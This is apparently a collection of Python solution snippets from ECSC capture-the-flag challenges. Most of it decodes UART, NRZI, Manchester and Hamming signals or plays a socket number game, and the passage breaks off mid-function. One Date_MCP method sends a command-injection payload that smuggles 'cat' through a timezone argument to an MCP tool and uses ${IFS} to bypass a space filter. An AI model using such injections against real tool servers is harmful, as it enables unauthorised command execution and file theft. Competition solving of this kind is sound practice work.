    def simulate_ansi_typing(self, text, escape_codes=True):
        result = ""
        for char in text:
            if char == " ":
                # Simulate clearing and moving cursor for space too
                result += "\x1b[?25l\x1b[K\x1b[1C\x1b[?25h"
            else:
                result += f"\x1b[?25l{char}\x1b[?25h"
        # result += "\n"  # Optional: simulate Enter
        if escape_codes:
            # Add ANSI escape codes to simulate typing
            return repr(result)
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_round(self):
        time.sleep(1)
        choice = [1, 2][0]
        # Get the visible number
        visible_number = self.recv_lines(1, save=True)[0]
        # print(visible_number)
        print(self.extract_printable_with_spaces(visible_number.decode("utf-8")))
        # visible_number = int(visible_number.split()[-1])
        # User choice
        # text_until = self.simulate_ansi_typing("> ")
        text_until = "> "
        # out = self.recv_send(
        #     text_until=text_until,
        #     lines=5,
        #     text=choice,
        #     display=True,
        #     save=True,
        # )
        out = self.recv_lines(6, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode("utf-8")))

        out = self.recv_until(text=text_until, ansi_escape=False)
        # print(out)
        self.send(choice)
        # for line in out:
        #     print(self.extract_printable_with_spaces(line.decode("utf-8")))
        out = self.recv_lines(2, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode("utf-8")))

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_game(self):
        self.choice_text = "The number on the table is "
        self.initiate_connection()
        self.get_welcome_message()

        # Some kind of loop probably
        self.play_round()

        round_result = self.recv_lines(1, save=True)[0]
        print(round_result)
        if "10/10" in round_result:
            self.recv_lines(3, display=True)

        self.conn.close()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def testing_ansii_escape(self):
        # self.play_game()

        text_until = self.simulate_ansi_typing("> ")
        print(text_until)
        phrase = b"The number on the table is 31"
        print(f"Simulating typing: {phrase}")
        simulated_typing = self.simulate_ansi_typing(phrase)
        print(f"Simulated typing output: {simulated_typing}")

        encoded = "\x1b[?25lT\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25lu\x1b[?25h\x1b[?25lm\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25lr\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lo\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25la\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25ll\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25li\x1b[?25h\x1b[?25ls\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25l3\x1b[?25h\x1b[?25l1\x1b[?25h\n"

        print(f"Encoded output: {encoded}")
        # Simulate sending the encoded string
        encoded = self.extract_printable_with_spaces(encoded)
        print(f"Extracted printable output: {encoded}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def main(self):
        self.play_game()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def initialize_values(self):
        # 2) Initialize MCP
        self.init = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {
                    "name": "challenge_solution",
                    "version": "1.0",
                },
            },
        }
        self.base_url = f"http://{self.url}:{self.port}"
        self.sse_url = f"{self.base_url}/sse"

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_request(self):
        self.session = requests.Session()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_sse(self, sse_url):
        self.messages = SSEClient(sse_url, session=self.session)
        first = next(self.messages).data
        m = re.search(r"session_id=([a-f0-9]+)", first)
        if not m:
            raise SystemExit("❌ Couldn't get session_id")
        self.sid = m.group(1)
        self.post_url = f"{self.base_url}/messages/?session_id={self.sid}"

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def exploit(self):
        # 3) Exploit: call get_current_time with injection
        # Note: no literal spaces allowed, so we use ${IFS} to stand in for a space.
        injection = 'Europe/Athens";cat${IFS}flag.txt;#'
        cat_call = {
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {"name": "get_current_time", "arguments": {"tz": injection}},
        }

        self.session.post(self.post_url, json=cat_call)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def tools_result(self):
        # 4) Listen for the tool’s result (either an "id":2 result or a tools/result notification)
        for msg in self.messages:
            try:
                pkt = json.loads(msg.data)
            except json.JSONDecodeError:
                continue

            # Case A: direct JSON-RPC reply
            if pkt.get("id") == 2 and "result" in pkt:
                out = pkt["result"]
            # Case B: a tools/result notification
            elif (
                pkt.get("method") == "tools/result"
                and pkt.get("params", {}).get("id") == 2
            ):
                out = pkt["params"]["result"]
            else:
                continue

            # out might be a string or a more structured object.
            text = out if isinstance(out, str) else json.dumps(out)

            # Search for our ECSC flag
            m2 = re.search(r"(ECSC\{.*?\})", text)
            if m2:
                flag = m2.group(1)
                print("Flag found:", flag)
            else:
                print("No flag in tool output. Raw output:")
                print(text)
            break
        return flag

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def interacting_with_mcp(self):
        self.session.post(self.post_url, json=self.init)
        # wait for init reply
        for msg in self.messages:
            data = json.loads(msg.data)
            if data.get("id") == 1:
                # send initialized notification
                self.session.post(
                    self.post_url,
                    json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                )
            break

        self.exploit()
        flag = self.tools_result()
        if flag:
            print(f"Flag: {flag}")
        else:
            print("❌ Flag not found")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def main(self):
        self.initialize_values()
        self.setup_request()
        self.setup_sse(self.sse_url)
        self.interacting_with_mcp()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "requests.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "requests.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/requests.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_nrzi(self, encoded_bits):
        """
        Decode a NRZ-I encoded bit string to ASCII.
        NRZ-I: A '1' means a transition, '0' means no transition.
        The first bit is assumed to be the initial signal level (0 or 1).
        """
        # Convert string to list of ints
        bits = list(map(int, encoded_bits))
        decoded_bits = []
        # Initial signal level
        current_level = bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(bits)):
            if bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def main(self):

        self.requests = []

        # text = "011011101110000100111001000010010011111011110000"
        # decoded = self.decode_nrzi(text)

        # text = "100110010110101000011000111110011000101010"
        # decoded = self.decode_hamming74(text)
        # # return

        # text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        # decoded = self.decode_hamming74(text)

        # #

        # text = "001101010010100001101100011011001"
        # text = "01110110011"
        # start = time.time()
        # # text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        # test = "0110001100101110111001011101110010110001100100000101001"
        # decoded = self.decode_uart(text)

        # print(f"time: {time.time() - start} - Decoded: {decoded}")
        # # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_nrzi(self, signal: str, verbose=False) -> str:
        """
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., "110110...").
        Returns the original bit string (e.g., "0100...").
        """
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f"Signal levels:   {levels}")
            print(f"Decoded bits:    {decoded_bits}")

        if verbose:
            print("".join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        if verbose:
            print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        if verbose:
            print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def main(self):

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round(verbose=True)
            except Exception as e:
                print(f"Error in round {i}: {e}")
                break

        self.recv_lines(3, display=True)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "requests.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "requests.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/requests.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f"Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}"
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f"Rest of bits: {rest_of_bits}")

        return valid_bits + rest_of_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater(self, bits: list, verbose=False):
        # print(bits)
        padding_length = len(bits) % 8
        if padding_length == 0:
            return bits

        padding_length = 8 - (len(bits) % 8)
        print(f"bits: {bits}")
        bits = [0] * padding_length + bits
        # bits += [0] * padding_length
        print(f"bits: {bits}")

        return bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_to_ascii(self, bits):
        grouped_bits = [bits[i : i + 8] for i in range(0, len(bits), 8)]
        ascii_chars = []
        for group in grouped_bits:
            value = int("".join(map(str, group)), 2)
            ascii_chars.append(chr(value))
        return "".join(ascii_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def encode_nrzi(self, bits: str, verbose=False) -> str:
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        # current_level = encoded_bits[0]
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
                # current_level ^= 1
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f"Decoded NRZI bits: {decoded_bits}")
        if verbose:
            print("".join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        # return self.bits_to_ascii(decoded_bits)
        return self.nrzi_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_nrzi(self, signal: str, verbose=False) -> str:
        """
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., "110110...").
        Returns the original bit string (e.g., "0100...").
        """
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f"Signal levels:   {levels}")
            print(f"Decoded bits:    {decoded_bits}")

        if verbose:
            print("".join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        if verbose:
            print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def main(self):

        self.requests = []

        # text = "011101000110110001110001101100100111001110110010"
        # text = "010110111010011111011010010011100010000110001100"
        # text = "011011101110000100111001000010010011111011110000"
        # text = "001011111001100110010011100000111010010110100011"
        text = "010010000110001110110000"
        resu = "100011111011110100100000"
        resu = "011100000100001011011111"
        # text = "100010001010101000"
        # decoded_result = "110110101010101011"
        # text = "011110111011010001000110"
        # print(text)
        # decoded = self.decode_nrzi(text, True)
        # print(decoded, decoded == resu)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

        self.recv_lines(3, display=True)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "request.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "request.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/request.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def ascii_converter(self, bits):
        """
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        """
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, "0")

        ascii_str = ""
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 <= ord(char) <= 126 or ord(char) in [10, 13]:
